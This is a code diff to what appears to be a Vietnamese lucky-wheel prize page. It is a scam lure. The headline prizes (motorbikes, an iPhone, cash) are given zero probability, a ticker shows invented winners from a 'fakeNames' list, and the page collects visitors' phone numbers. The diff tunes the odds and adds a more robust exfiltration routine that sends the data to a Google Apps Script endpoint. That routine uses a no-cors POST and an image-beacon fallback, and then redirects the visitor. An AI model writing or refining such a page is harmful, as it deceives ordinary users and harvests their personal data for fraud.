@@ -63,10 +63,11 @@ canvas#wheel{border-radius:50%;display:block;width:100%;height:100%;}
 .prize-count.bump{background:rgba(255,215,0,.4);transform:scale(1.15);}
 .live-ticker{padding:8px 14px;background:rgba(0,0,0,.3);font-size:11px;color:rgba(255,255,255,.8);text-align:center;border-top:1px solid rgba(255,215,0,.15);}
 .live-ticker b{color:var(--gold);}
-.overlay{display:none;position:fixed;inset:0;background:rgba(0,0,0,.75);z-index:400;align-items:flex-end;justify-content:center;backdrop-filter:blur(6px);}
+.overlay{display:none;position:fixed;inset:0;background:rgba(0,0,0,.75);z-index:400;align-items:center;justify-content:center;backdrop-filter:blur(6px);}
 .overlay.show{display:flex;}
-.sheet{width:100%;max-width:480px;border-radius:24px 24px 0 0;padding:20px 20px 36px;animation:slideUp .35s cubic-bezier(.34,1.4,.64,1);}
+.sheet{width:92%;max-width:420px;border-radius:24px;padding:24px 24px 32px;animation:popUp .4s cubic-bezier(.34,1.56,.64,1);}
 @keyframes slideUp{from{transform:translateY(100%);opacity:0;}to{transform:translateY(0);opacity:1;}}
+@keyframes popUp{from{transform:scale(0.6);opacity:0;}to{transform:scale(1);opacity:1;}}
 #resultOverlay .sheet{background:linear-gradient(160deg,#7f0000,#c0392b);border:2px solid var(--gold);box-shadow:0 -10px 60px rgba(0,0,0,.5);text-align:center;}
 .sheet-handle{width:40px;height:4px;background:rgba(255,255,255,.3);border-radius:2px;margin:0 auto 16px;}
 .result-congrats{font-size:12px;color:var(--gold);letter-spacing:2px;margin-bottom:6px;}
@@ -248,18 +249,18 @@ const APPS_SCRIPT_URL = 'https://script.google.com/macros/s/AKfycbwEFL0PIXcIF4fe
 const STORAGE_KEY = 'vqmm_v3_2026';
 
 const prizes=[
-  {name:"May mắn lần sau",  icon:"🍀",color:"#e74c3c",prob:15, base:3842,value:0},
+  {name:"May mắn lần sau",  icon:"🍀",color:"#e74c3c",prob:5, base:3842,value:0},
   {name:"Xe máy SH 150i",   icon:"🛵",color:"#f8f8f8",prob:0, base:2,   value:0},
   {name:"iPhone 16 Pro Max",icon:"📱",color:"#e74c3c",prob:0, base:5,   value:0},
   {name:"Xe máy Vision 2026",icon:"🏍️",color:"#f8f8f8",prob:0,base:3,  value:0},
   {name:"Thưởng 500K",      icon:"💰",color:"#e74c3c",prob:0, base:18,  value:500000},
   {name:"Thưởng 200K",      icon:"💵",color:"#f8f8f8",prob:0, base:47,  value:200000},
   {name:"Thưởng 100K",      icon:"💴",color:"#e74c3c",prob:0, base:124, value:100000},
-  {name:"Quà tặng đặc biệt",icon:"🎁",color:"#f8f8f8",prob:50,base:1563,value:0},
-  {name:"May mắn lần sau",  icon:"🍀",color:"#e74c3c",prob:15, base:3791,value:0},
+  {name:"Quà tặng đặc biệt",icon:"🎁",color:"#f8f8f8",prob:20,base:1563,value:0},
+  {name:"May mắn lần sau",  icon:"🍀",color:"#e74c3c",prob:5, base:3791,value:0},
   {name:"Thưởng 350K",      icon:"💎",color:"#f8f8f8",prob:0, base:29,  value:350000},
   {name:"Điểm thưởng 150K", icon:"⭐",color:"#e74c3c",prob:0, base:83,  value:150000},
-  {name:"Thưởng 50K",       icon:"🧧",color:"#f8f8f8",prob:25,base:5287,value:50000},
+  {name:"Thưởng 50K",       icon:"🧧",color:"#f8f8f8",prob:70,base:5287,value:50000},
 ];
 const fakeNames=["Nguyễn V.A","Trần T.B","Lê M.C","Phạm T.D","Hoàng V.E","Đặng T.F","Vũ M.G","Bùi T.H","Đỗ V.I","Ngô T.K","Dương V.L","Lý T.M","Phan V.N","Võ T.O","Đinh M.P"];
 const pool=[];prizes.forEach((p,i)=>{for(let j=0;j<p.prob;j++)pool.push(i);});
@@ -315,20 +316,40 @@ function goToSite(){window.location.href=REDIRECT_URL;}
 
 // =================== GỬI DATA LÊN GOOGLE SHEET ===================
 async function sendToGoogleSheet(payload){
-  try{
-    await fetch(APPS_SCRIPT_URL,{
-      method:'POST',
-      mode:'no-cors', // bắt buộc với Apps Script
-      headers:{'Content-Type':'application/json'},
-      body:JSON.stringify(payload)
-    });
-    return true;
-  }catch(e){
-    console.warn('Sheet gửi lỗi:',e);
-    return false; // vẫn cho redirect dù lỗi
-  }
-}
+  return new Promise((resolve)=>{
+    try{
+      // Encode payload thành URL params để tránh CORS preflight
+      const params = new URLSearchParams();
+      params.append('data', JSON.stringify(payload));
 
+      // Gửi bằng fetch application/x-www-form-urlencoded — không trigger CORS preflight
+      fetch(APPS_SCRIPT_URL, {
+        method: 'POST',
+        mode: 'no-cors',
+        body: params
+      }).then(()=>{
+        console.log('✅ Đã gửi fetch');
+        resolve(true);
+      }).catch(err=>{
+        console.warn('fetch lỗi:', err);
+      });
+
+      // Backup: Image beacon GET request với data trong URL
+      const getUrl = APPS_SCRIPT_URL + '?data=' + encodeURIComponent(JSON.stringify(payload));
+      const img = new Image();
+      img.src = getUrl;
+      img.onload = img.onerror = ()=>{
+        console.log('✅ Đã gửi beacon');
+        resolve(true);
+      };
+
+      setTimeout(()=>resolve(true), 3000);
+    }catch(e){
+      console.warn('Lỗi gửi:',e);
+      resolve(false);
+    }
+  });
+}
 // Verify button
 function checkReady(){
   const ph=document.getElementById('phoneInput').value.trim();
